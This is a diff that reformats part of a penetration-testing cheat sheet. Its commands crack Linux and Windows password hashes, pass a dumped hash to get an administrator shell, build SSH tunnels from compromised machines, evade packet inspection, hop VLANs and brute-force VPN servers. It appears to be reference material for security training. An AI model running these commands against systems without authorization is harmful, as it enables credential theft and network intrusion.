@@ -1887,29 +1887,31 @@ apt-get install pocl-opencl-icd
         [*http://openwall.info/wiki/john/sample-hashes*](http://openwall.info/wiki/john/sample-hashes)
 
     -   Identify Hashes  
-        hash-identifier
+    
+        `hash-identifier`
 
-    -   Crask linux hashes you must first unshadow them:  
-        unshadow passwd-file.txt shadow-file.txt  
-        unshadow passwd-file.txt shadow-file.txt > unshadowed.txt
+    -   To crack linux hashes you must first unshadow them:  
+    
+        `unshadow passwd-file.txt shadow-file.txt  `
+        `unshadow passwd-file.txt shadow-file.txt > unshadowed.txt`
 
 -   John the Ripper - Password Hash Cracking
 
-    -   john $ip.pwdump
+    -   `john $ip.pwdump`
 
-    -   john --wordlist=/usr/share/wordlists/rockyou.txt hashes
+    -   `john --wordlist=/usr/share/wordlists/rockyou.txt hashes`
 
-    -   john --rules --wordlist=/usr/share/wordlists/rockyou.txt
+    -   `john --rules --wordlist=/usr/share/wordlists/rockyou.txt`
 
-    -   john --rules --wordlist=/usr/share/wordlists/rockyou.txt
-        unshadowed.txt
+    -   `john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt`
 
     -   JTR forced descrypt cracking with wordlist  
-        john --format=descrypt --wordlist  
-        /usr/share/wordlists/rockyou.txt hash.txt
+    
+        `john --format=descrypt --wordlist  /usr/share/wordlists/rockyou.txt hash.txt`
 
     -   JTR forced descrypt brute force cracking  
-        john --format=descrypt hash --show
+    
+        `john --format=descrypt hash --show`
 
 -   Passing the Hash in Windows
 
@@ -1917,10 +1919,9 @@ apt-get install pocl-opencl-icd
         Dump the password hashes and attempt a pass-the-hash attack
         against another system:  
           
-        export
-        SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896  
+        `export SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896 `
           
-        pth-winexe -U administrator //$ip cmd
+        `pth-winexe -U administrator //$ip cmd`
 
 <span id="_6nmbgmpltwon" class="anchor"><span id="_Toc480741823" class="anchor"></span></span>Networking, Pivoting and Tunneling
 ================================================================================================================================
@@ -1928,58 +1929,59 @@ apt-get install pocl-opencl-icd
 -   Port Forwarding - accept traffic on a given IP address and port and
     redirect it to a different IP address and port
 
-    -   apt-get install rinetd
+    -   `apt-get install rinetd`
 
-    -   cat /etc/rinetd.conf  
-        \# bindadress bindport connectaddress connectport  
-        w.x.y.z 53 a.b.c.d 80
+    -   `cat /etc/rinetd.conf  `
+        `\# bindadress bindport connectaddress connectport ` 
+        `w.x.y.z 53 a.b.c.d 80`
 
 -   SSH Local Port Forwarding: supports bi-directional communication
     channels
 
-    -   ssh <gateway> -L <local port to listen>:<remote
-        host>:<remote port>
+    -   `ssh <gateway> -L <local port to listen>:<remote
+        host>:<remote port>`
 
 -   SSH Remote Port Forwarding: Suitable for popping a remote shell on
     an internal non routable network
 
-    -   ssh <gateway> -R <remote port to bind>:<local
-        host>:<local port>  
+    -   `ssh <gateway> -R <remote port to bind>:<local
+        host>:<local port>` 
 
 -   SSH Dynamic Port Forwarding: create a SOCKS4 proxy on our local
     attacking box to tunnel ALL incoming traffic to ANY host in the DMZ
     network on ANY PORT
 
-    -   ssh -D <local proxy port> -p <remote port>
-        <target>
+    -   `ssh -D <local proxy port> -p <remote port>
+        <target>`
 
 -   Proxychains - Perform nmap scan within a DMZ from an external
     computer
 
     -   Create reverse SSH tunnel from Popped machine on :2222  
-        ssh -f -N -R 2222:$ip:22 root@$ip
+        
+        `ssh -f -N -R 2222:$ip:22 root@$ip`
 
     -   Create a Dynamic application-level port forward on 8080 thru
         2222  
-        ssh -f -N -D $ip:8080 -p 2222 hax0r@$ip
+        
+        `ssh -f -N -D $ip:8080 -p 2222 hax0r@$ip`
 
     -   Leverage the SSH SOCKS server to perform Nmap scan on network
         using proxy chains  
-        proxychains nmap --top-ports=20 -sT -Pn $ip/24
+        
+        `proxychains nmap --top-ports=20 -sT -Pn $ip/24`
 
 -   HTTP Tunneling  
-    nc -vvn $ip 8888
+      
+      `nc -vvn $ip 8888`
 
 -   Traffic Encapsulation - Bypassing deep packet inspection
 
     -   http\_tunnel  
         On server side:  
-        sudo hts -F <server\_ip\_addr>:<port\_of\_your\_app>
-        80  
+        `sudo hts -F <server\_ip\_addr>:<port\_of\_your\_app> 80  `
         On client side:  
-        sudo htc -P <my\_proxy.com:proxy\_port> -F
-        <port\_of\_your\_app> <server\_ip\_addr>:80  
-        stunnel
+        `sudo htc -P <my\_proxy.com:proxy\_port> -F <port\_of\_your\_app> <server\_ip\_addr>:80 stunnel`
 
 -   Tunnel Remote Desktop (RDP) from a Popped Windows machine to your
     network
@@ -2018,20 +2020,21 @@ apt-get install pocl-opencl-icd
 
 -   VLAN Hopping
 
-    -   git clone https://github.com/nccgroup/vlan-hopping.git  
+    -   ```git clone https://github.com/nccgroup/vlan-hopping.git  
         chmod 700 frogger.sh  
         ./frogger.sh
+        ```
 
 -   VPN Hacking
 
     -   Identify VPN servers:  
-        ./udp-protocol-scanner.pl -p ike $ip
+        `./udp-protocol-scanner.pl -p ike $ip`
 
     -   Scan a range for VPN servers:  
-        ./udp-protocol-scanner.pl -p ike -f ip.txt
+        `./udp-protocol-scanner.pl -p ike -f ip.txt`
 
     -   Use IKEForce to enumerate or dictionary attack VPN servers:  
-        pip install pyip  
+        `pip install pyip`  
         git clone <https://github.com/SpiderLabs/ikeforce.git>  
         Perform IKE VPN enumeration with IKEForce:  
         ./ikeforce.py TARGET-IP –e –w wordlists/groupnames.dic  
